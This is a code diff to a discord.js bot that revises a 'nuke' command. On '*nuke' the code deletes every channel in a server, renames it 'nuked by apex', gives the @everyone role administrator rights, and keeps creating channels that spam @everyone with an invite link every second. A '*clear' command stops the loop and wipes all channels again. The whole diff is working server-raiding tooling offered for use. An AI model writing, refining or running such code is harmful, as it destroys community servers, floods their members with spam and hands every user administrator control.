@@ -1,21 +1,4 @@
-/*
-
-☆.。.:*・°☆.。.:*・°☆.。.:*・°☆.。.:*・°☆
-                                                 
-  _________ ___ ___ ._______   _________    
- /   _____//   |   \|   \   \ /   /  _  \   
- \_____  \/    ~    \   |\   Y   /  /_\  \  
- /        \    Y    /   | \     /    |    \ 
-/_______  /\___|_  /|___|  \___/\____|__  / 
-        \/       \/                     \/  
-                    
-                                                                       
-☆.。.:*・°☆.。.:*・°☆.。.:*・°☆.。.:*・°☆
-
-
-*/
-
-const { Client, GatewayIntentBits, Permissions } = require('discord.js');
+const { Client, GatewayIntentBits, ActivityType } = require('discord.js');
 require('dotenv').config();
 const express = require('express');
 const path = require('path');
@@ -40,6 +23,80 @@ app.listen(port, () => {
   console.log('\x1b[36m[ SERVER ]\x1b[0m', '\x1b[32m SH : http://localhost:' + port + ' ✅\x1b[0m');
 });
 
+let nukeInterval; // To store the nuke process
+
+client.once('ready', () => {
+  console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mPing: ${client.ws.ping} ms \x1b[0m`);
+});
+
+client.on('messageCreate', async (message) => {
+  if (message.author.bot) return; // Ignore bot messages
+  if (message.content === '*nuke') {
+    try {
+      // Delete all existing channels
+      const channels = message.guild.channels.cache;
+      for (const channel of channels.values()) {
+        await channel.delete();
+      }
+
+      // Rename server
+      await message.guild.setName('nuked by apex');
+
+      // Update @everyone role permissions
+      const everyoneRole = message.guild.roles.everyone;
+      await everyoneRole.setPermissions(['ADMINISTRATOR']);
+
+      // Function to create a new channel and start spamming
+      const createAndSpamChannel = async () => {
+        const channel = await message.guild.channels.create('nuked by apex', {
+          type: 'GUILD_TEXT'
+        });
+
+        // Spam messages in the new channel
+        setInterval(() => {
+          channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
+        }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
+      };
+
+      // Create the initial channel
+      await createAndSpamChannel();
+
+      // Infinite loop to continually create new channels and start spamming
+      nukeInterval = setInterval(async () => {
+        await createAndSpamChannel();
+      }, 10000); // Adjust the interval as needed (10000 ms = 10 seconds)
+
+    } catch (error) {
+      console.error('Error during nuke operation:', error);
+    }
+  }
+
+  if (message.content === '*clear') {
+    try {
+      // Stop the nuke process
+      if (nukeInterval) {
+        clearInterval(nukeInterval);
+        message.channel.send('Nuke process stopped.');
+      }
+
+      // Delete all channels
+      const allChannels = message.guild.channels.cache;
+      for (const channel of allChannels.values()) {
+        await channel.delete();
+      }
+
+      // Create a "general" channel after all channels are deleted
+      await message.guild.channels.create('general', {
+        type: 'GUILD_TEXT'
+      });
+
+      message.channel.send('All channels have been deleted and a "general" channel has been created.');
+    } catch (error) {
+      console.error('Error during clear operation:', error);
+    }
+  }
+});
+
 async function login() {
   try {
     await client.login(process.env.TOKEN);
@@ -51,68 +108,5 @@ async function login() {
     process.exit(1);
   }
 }
-
-client.once('ready', () => {
-  console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mPing: ${client.ws.ping} ms \x1b[0m`);
-});
-
-client.on('messageCreate', async (message) => {
-  if (message.content === '*nuke') {
-    // Delete all existing channels
-    message.guild.channels.cache.forEach(channel => channel.delete());
-
-    // Rename server
-    await message.guild.setName('nuked by apex');
-
-    // Update @everyone role permissions
-    const everyoneRole = message.guild.roles.everyone;
-    await everyoneRole.setPermissions(Permissions.FLAGS.ADMINISTRATOR);
-
-    // Function to create a new channel and start spamming
-    const createAndSpamChannel = async () => {
-      const channel = await message.guild.channels.create('nuked by apex', {
-        type: 'GUILD_TEXT'
-      });
-
-      // Spam messages in the new channel
-      setInterval(() => {
-        channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
-      }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
-    };
-
-    // Create the initial channel
-    await createAndSpamChannel();
-
-    // Infinite loop to continually create new channels and start spamming
-    nukeInterval = setInterval(async () => {
-      await createAndSpamChannel();
-    }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
-  }
-
-  if (message.content === '*clear') {
-    // Stop the nuke process
-    if (nukeInterval) {
-      clearInterval(nukeInterval);
-      message.channel.send('Nuke process stopped.');
-    }
-
-    // Delete all channels
-    const allChannels = message.guild.channels.cache;
-    let deletePromises = [];
-    for (const channel of allChannels.values()) {
-      deletePromises.push(channel.delete());
-    }
-
-    // Wait for all channels to be deleted
-    await Promise.all(deletePromises);
-
-    // Create a "general" channel after all channels are deleted
-    await message.guild.channels.create('general', {
-      type: 'GUILD_TEXT'
-    });
-
-    message.channel.send('All channels have been deleted and a "general" channel has been created.');
-  }
-});
 
 login();
